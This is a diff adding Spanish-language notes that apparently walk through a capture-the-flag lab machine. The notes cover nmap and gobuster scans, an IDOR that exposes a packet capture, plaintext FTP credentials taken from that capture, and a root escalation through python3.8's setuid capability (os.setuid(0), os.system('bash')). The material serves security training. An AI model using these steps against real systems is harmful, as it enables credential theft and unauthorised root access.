@@ -1,0 +1,50 @@
+	10.129.92.173
+	
+	Nmap
+	
+		sudo nmap -sVC 10.129.92.173 -Pn
+		
+	Puertos
+	
+		21 vsdtpd 3.0.3
+		22
+		80
+		
+		Gunicorn
+		
+	Puerto 80
+	
+		Usuario Nathan
+		
+		Descargar .pcap
+	
+	gobuster dir -u http://10.129.92.173 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js -t 50
+	
+	IDOR
+	
+		/data/0 > Buscar las credenciales
+		
+			ftp.request.command == "USER" (36)
+			
+			user > nathan
+			pass > Buck3tH4TF0RM3!
+			
+	Conexión por SSH
+	
+		Se usa sudo -l para intentar conectarnos a root, pero no nos lo permite. Usaremos getcap, para tratar de enumerar archivos de interés. 
+
+            getcap -r / 2>/dev/null
+
+        Uno de los ficheros es python3.8. En la ruta /usr/bin buscaremos el archivo python3.8 y lo ejecutaremos. 
+
+            ./python3.8
+
+        Una vez ejecutado, introduciremos lo siguiente: 
+
+            >> import os
+            >> os.setuid(0)
+            >> os.system(“bash”)
+
+        Y ya estaremos dentro del usuario root
+	
+	
